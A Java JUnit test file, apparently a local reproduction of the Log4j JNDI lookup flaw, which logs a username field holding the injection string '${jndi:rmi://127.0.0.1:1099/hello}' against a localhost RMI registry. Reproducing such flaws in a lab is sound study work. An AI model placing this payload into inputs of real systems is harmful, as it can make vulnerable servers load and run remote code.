package com.bug.log4j;

import lombok.extern.slf4j.Slf4j;
import org.junit.Test;

import javax.management.remote.rmi.RMIServer;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.util.Date;
import java.util.Hashtable;
import java.util.Properties;

/**
 * Log4jTest class
 *
 * @author 谢小平
 * @date 2021/12/11
 */
@Slf4j
public class Log4jTest {

    @Test
    public void testBug(){
        String username = "${jndi:rmi://127.0.0.1:1099/hello}";
        log.info("hello,{},",username);
    }

    public static void main(String[] args) throws Exception{
        //创建远程对象实例
//        new RMIServer().start();
        // 配置 JNDI 默认设置
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL,
                "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        HelloWorld helloWorld = (HelloWorld)ctx.lookup("hello");
        System.out.println(helloWorld.Hello());
        System.out.println(helloWorld.HelloWorld());

        String username = "${jndi:rmi://127.0.0.1:1099/hello}";
        log.info("hello,{},",username);
    }
}
